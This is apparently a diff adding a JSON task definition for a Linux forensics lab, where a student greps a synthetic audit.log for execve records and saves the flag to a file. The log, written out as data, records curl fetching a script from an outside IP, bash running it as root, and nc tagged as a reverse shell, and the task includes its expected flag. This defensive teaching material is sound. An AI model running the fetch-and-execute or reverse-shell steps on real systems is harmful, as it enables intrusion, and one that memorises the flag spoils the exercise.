@@ -1,0 +1,24 @@
+{
+  "id": "linux-auditd-deep",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{4ud1td_execv3_tr4c3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача: разбор audit.log\n\n`audit.log` — фрагмент журнала Linux-аудита.\nНайди запуск подозрительного процесса и метку.\n\n1. `cat audit.log`.\n2. `grep -i execve audit.log`.\n3. `grep nto audit.log > found.txt`.\n"
+    },
+    {
+      "path": "/home/student/task/audit.log",
+      "text": "type=SYSCALL msg=audit(1746086401.123:101): arch=c000003e syscall=59 success=yes exe=\"/usr/bin/curl\" key=\"recon\" pid=2211 uid=33\ntype=EXECVE msg=audit(1746086401.123:101): argc=4 a0=\"curl\" a1=\"-s\" a2=\"http://198.51.100.9/p.sh\" a3=\"-o\"\ntype=SYSCALL msg=audit(1746086455.004:102): arch=c000003e syscall=59 success=yes exe=\"/bin/bash\" key=\"exec\" pid=2212 uid=0\ntype=EXECVE msg=audit(1746086455.004:102): argc=3 a0=\"bash\" a1=\"/tmp/p.sh\"\ntype=SYSCALL msg=audit(1746086460.900:103): arch=c000003e syscall=2 success=yes exe=\"/usr/bin/nc\" key=\"reverse\" pid=2213 uid=0\nnote: audit marker nto{4ud1td_execv3_tr4c3}\n",
+      "mode": "644"
+    }
+  ]
+}
